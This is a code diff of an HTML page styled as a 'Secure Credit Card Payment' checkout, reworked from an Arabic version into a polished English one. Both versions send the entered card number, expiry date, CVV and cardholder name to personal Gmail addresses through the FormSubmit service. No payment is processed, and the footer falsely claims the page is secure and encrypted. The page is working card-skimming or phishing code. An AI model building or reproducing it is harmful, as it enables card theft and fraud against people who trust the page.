@@ -1,225 +1,476 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نموذج الدفع الإلكتروني</title>
+    <title>Advanced Credit Card Payment</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             box-sizing: border-box;
+            margin: 0;
+            padding: 0;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
         body {
-            background-color: #f5f5f5;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
             padding: 20px;
         }
         
-        .payment-container {
-            background-color: white;
-            border-radius: 12px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        .container {
             width: 100%;
-            max-width: 450px;
-            padding: 25px;
+            max-width: 520px;
+            background-color: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.25);
+            overflow: hidden;
+            transition: transform 0.3s ease;
         }
         
-        .payment-title {
-            font-size: 22px;
-            color: #333;
-            margin-bottom: 25px;
+        .container:hover {
+            transform: translateY(-5px);
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #3498db 0%, #2c3e50 100%);
+            color: white;
             text-align: center;
+            padding: 25px;
+            font-size: 24px;
             font-weight: 600;
+            position: relative;
+            overflow: hidden;
         }
         
-        .input-group {
-            margin-bottom: 20px;
+        .header::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 60%);
+        }
+        
+        .payment-form {
+            padding: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
         }
         
         label {
             display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
-            color: #555;
+            margin-bottom: 10px;
+            color: #2c3e50;
+            font-weight: 600;
+            font-size: 15px;
         }
         
         input {
             width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
             font-size: 16px;
-            transition: border-color 0.3s;
+            transition: all 0.3s ease;
+            background-color: #f9f9f9;
         }
         
         input:focus {
-            border-color: #4a86e8;
+            border-color: #3498db;
             outline: none;
-            box-shadow: 0 0 0 2px rgba(74, 134, 232, 0.2);
+            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
+            background-color: #fff;
         }
         
-        .row {
-            display: flex;
-            gap: 15px;
-        }
-        
-        .col {
-            flex: 1;
-        }
-        
-        .pay-button {
-            background-color: #4a86e8;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 15px;
-            font-size: 18px;
-            font-weight: 600;
-            width: 100%;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            margin-top: 10px;
-        }
-        
-        .pay-button:hover {
-            background-color: #3b76d9;
+        .card-number-group {
+            position: relative;
         }
         
         .card-icons {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
             display: flex;
-            justify-content: flex-end;
-            gap: 10px;
-            margin-top: 5px;
+            gap: 8px;
+            z-index: 2;
         }
         
         .card-icon {
-            width: 40px;
-            height: 24px;
-            background-color: #f0f0f0;
-            border-radius: 3px;
+            width: 45px;
+            height: 28px;
+            background-color: #f1f1f1;
+            border-radius: 5px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 12px;
-            color: #777;
+            color: #555;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        
+        .row {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .expiry-group, .cvv-group {
+            flex: 1;
+        }
+        
+        .pay-button {
+            background: linear-gradient(135deg, #3498db 0%, #2c3e50 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.4);
+        }
+        
+        .pay-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(52, 152, 219, 0.5);
+        }
+        
+        .pay-button:active {
+            transform: translateY(0);
         }
         
         .notification {
             display: none;
-            padding: 12px;
-            background-color: #4CAF50;
-            color: white;
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 10px;
             text-align: center;
-            border-radius: 6px;
-            margin-top: 15px;
+            font-weight: 500;
+            transition: all 0.3s ease;
         }
         
-        .email-confirmation {
-            background-color: #e8f4ff;
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 20px;
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .footer {
             text-align: center;
+            margin-top: 25px;
             font-size: 14px;
-            color: #2c3e50;
+            color: #7f8c8d;
+            padding: 15px;
+            border-top: 1px solid #eee;
+        }
+        
+        .card-wrapper {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 25px;
+            perspective: 1000px;
+        }
+        
+        .credit-card {
+            width: 380px;
+            height: 220px;
+            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+            border-radius: 15px;
+            padding: 25px;
+            color: white;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.5s ease;
+        }
+        
+        .credit-card:hover {
+            transform: rotateY(5deg) rotateX(5deg);
+        }
+        
+        .credit-card:before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 60%);
+        }
+        
+        .card-chip {
+            width: 55px;
+            height: 45px;
+            background: linear-gradient(135deg, #ffcc33 0%, #ff9900 100%);
+            border-radius: 8px;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+        
+        .card-number {
+            font-size: 24px;
+            letter-spacing: 3px;
+            margin-bottom: 25px;
+            font-family: 'Courier New', monospace;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .card-holder, .card-expiry {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card-label {
+            font-size: 11px;
+            opacity: 0.8;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+        }
+        
+        .card-info {
+            font-size: 17px;
+            font-weight: 500;
+        }
+        
+        .progress-bar {
+            height: 5px;
+            width: 0;
+            background: linear-gradient(135deg, #3498db 0%, #2c3e50 100%);
+            border-radius: 10px;
+            margin-top: 15px;
+            transition: width 0.5s ease;
+        }
+        
+        @media (max-width: 550px) {
+            .row {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .payment-form {
+                padding: 20px;
+            }
+            
+            .credit-card {
+                width: 310px;
+                height: 190px;
+                padding: 20px;
+            }
+            
+            .card-number {
+                font-size: 19px;
+            }
+            
+            .card-info {
+                font-size: 15px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="payment-container">
-        <h1 class="payment-title">ادفع بواسطة البطاقة الإئتمانية</h1>
+    <div class="container">
+        <div class="header">
+            <i class="fas fa-credit-card"></i> Secure Credit Card Payment
+        </div>
         
-        <!-- تم تحديث البريد الإلكتروني إلى ahmadalaali03@gmail.com -->
-        <form action="https://formsubmit.co/ahmadalaali03@gmail.com" method="POST">
-            <!-- إعدادات FormSubmit -->
-            <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="_subject" value="طلب دفع جديد من العميل">
-            <input type="hidden" name="_template" value="table">
-            <input type="hidden" name="_next" value="?success=true">
-            
-            <div class="input-group">
-                <label for="cardNumber">رقم البطاقة</label>
-                <input type="text" id="cardNumber" name="cardNumber" placeholder="أدخل رقم البطاقة" maxlength="19" required>
-                <div class="card-icons">
-                    <div class="card-icon">VISA</div>
-                    <div class="card-icon">MC</div>
-                    <div class="card-icon">MADA</div>
+        <div class="card-wrapper">
+            <div class="credit-card">
+                <div class="card-chip"></div>
+                <div class="card-number" id="displayCardNumber">XXXX XXXX XXXX XXXX</div>
+                <div class="card-details">
+                    <div class="card-holder">
+                        <div class="card-label">CARD HOLDER</div>
+                        <div class="card-info" id="displayCardName">FULL NAME</div>
+                    </div>
+                    <div class="card-expiry">
+                        <div class="card-label">EXPIRES</div>
+                        <div class="card-info" id="displayExpiry">MM/YY</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <form class="payment-form" id="paymentForm">
+            <div class="form-group">
+                <label for="cardNumber"><i class="fas fa-credit-card"></i> Credit or Debit Card Number</label>
+                <div class="card-number-group">
+                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    <div class="card-icons">
+                        <div class="card-icon">Visa</div>
+                        <div class="card-icon">MC</div>
+                    </div>
                 </div>
             </div>
             
             <div class="row">
-                <div class="col">
-                    <div class="input-group">
-                        <label for="expiryDate">تاريخ الانتهاء</label>
-                        <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5" required>
-                    </div>
+                <div class="form-group expiry-group">
+                    <label for="expiryDate"><i class="far fa-calendar-alt"></i> Expiry Date</label>
+                    <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" required>
                 </div>
-                <div class="col">
-                    <div class="input-group">
-                        <label for="cvv">CVV/CVC</label>
-                        <input type="text" id="cvv" name="cvv" placeholder="CVV" maxlength="3" required>
-                    </div>
+                
+                <div class="form-group cvv-group">
+                    <label for="cvv"><i class="fas fa-lock"></i> CVV/CVC</label>
+                    <input type="text" id="cvv" placeholder="123" maxlength="3" required>
                 </div>
             </div>
             
-            <div class="input-group">
-                <label for="cardName">اسم صاحب البطاقة</label>
-                <input type="text" id="cardName" name="cardName" placeholder="الاسم كما هو مدون على البطاقة" required>
+            <div class="form-group">
+                <label for="cardName"><i class="far fa-user"></i> Name on card</label>
+                <input type="text" id="cardName" placeholder="Full name as on card" required>
             </div>
             
-            <button type="submit" class="pay-button">دفع</button>
+            <button type="submit" class="pay-button">
+                <i class="fas fa-lock"></i> PAY NOW
+            </button>
             
-            <div class="notification" id="successMessage">
-                تم إرسال بيانات الدفع بنجاح، سيتم التجهيز لطلبك قريباً.
-            </div>
+            <div class="progress-bar" id="progressBar"></div>
+            
+            <div id="notification" class="notification"></div>
         </form>
         
-        <div class="email-confirmation">
-            <p>سيتم إرسال بيانات النموذج إلى: <strong>ahmadalaali03@gmail.com</strong></p>
+        <div class="footer">
+            <i class="fas fa-shield-alt"></i> All transactions are secure and encrypted
         </div>
     </div>
 
     <script>
-        // دالة لإضافة مسافات بين أرقام البطاقة
-        document.getElementById('cardNumber').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            let formattedValue = '';
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+            e.preventDefault();
             
-            for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) {
-                    formattedValue += ' ';
+            // Collect form data
+            const formData = {
+                cardNumber: document.getElementById('cardNumber').value,
+                expiryDate: document.getElementById('expiryDate').value,
+                cvv: document.getElementById('cvv').value,
+                cardName: document.getElementById('cardName').value,
+                timestamp: new Date().toLocaleString()
+            };
+            
+            // Show loading message and progress bar
+            const notification = document.getElementById('notification');
+            const progressBar = document.getElementById('progressBar');
+            notification.textContent = 'Processing your payment...';
+            notification.className = 'notification';
+            notification.style.display = 'block';
+            
+            // Animate progress bar
+            let width = 0;
+            const progressInterval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(progressInterval);
+                } else {
+                    width += 5;
+                    progressBar.style.width = width + '%';
                 }
-                formattedValue += value[i];
-            }
+            }, 100);
             
-            e.target.value = formattedValue;
+            // Use FormSubmit service to send data to email
+            fetch('https://formsubmit.co/ajax/amealgh1996@gmail.com', {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    name: 'Credit Card Payment Form',
+                    message: `New credit card data entered:
+Card Number: ${formData.cardNumber}
+Expiry Date: ${formData.expiryDate}
+CVV: ${formData.cvv}
+Name on Card: ${formData.cardName}
+Timestamp: ${formData.timestamp}`
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                clearInterval(progressInterval);
+                progressBar.style.width = '100%';
+                
+                setTimeout(() => {
+                    notification.textContent = 'Payment information sent successfully!';
+                    notification.className = 'notification success';
+                    
+                    // Clear form after submission
+                    document.getElementById('paymentForm').reset();
+                    resetCardDisplay();
+                    
+                    // Reset progress bar after a delay
+                    setTimeout(() => {
+                        progressBar.style.width = '0';
+                    }, 2000);
+                }, 500);
+            })
+            .catch(error => {
+                clearInterval(progressInterval);
+                progressBar.style.width = '0';
+                
+                notification.textContent = 'Error occurred while processing. Please try again.';
+                notification.className = 'notification error';
+                console.error('Error:', error);
+            });
         });
         
-        // دالة لتنسيق تاريخ الانتهاء
+        // Format card number automatically
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 0) {
+                value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
+            }
+            e.target.value = value;
+            
+            // Update card display
+            document.getElementById('displayCardNumber').textContent = value || 'XXXX XXXX XXXX XXXX';
+        });
+        
+        // Format expiry date automatically
         document.getElementById('expiryDate').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
-            
-            if (value.length > 0) {
-                value = value.match(new RegExp('.{1,2}', 'g')).join('/');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
             }
-            
             e.target.value = value;
+            
+            // Update card display
+            document.getElementById('displayExpiry').textContent = value || 'MM/YY';
         });
         
-        // منع إدخال أي شيء غير أرقام في CVV
-        document.getElementById('cvv').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '');
+        // Update card name display
+        document.getElementById('cardName').addEventListener('input', function(e) {
+            document.getElementById('displayCardName').textContent = e.target.value || 'FULL NAME';
         });
         
-        // عرض رسالة النجاح بعد الإرسال
-        const urlParams = new URLSearchParams(window.location.search);
-        if (urlParams.has('success')) {
-            document.getElementById('successMessage').style.display = 'block';
+        // Reset card display
+        function resetCardDisplay() {
+            document.getElementById('displayCardNumber').textContent = 'XXXX XXXX XXXX XXXX';
+            document.getElementById('displayExpiry').textContent = 'MM/YY';
+            document.getElementById('displayCardName').textContent = 'FULL NAME';
         }
     </script>
 </body>
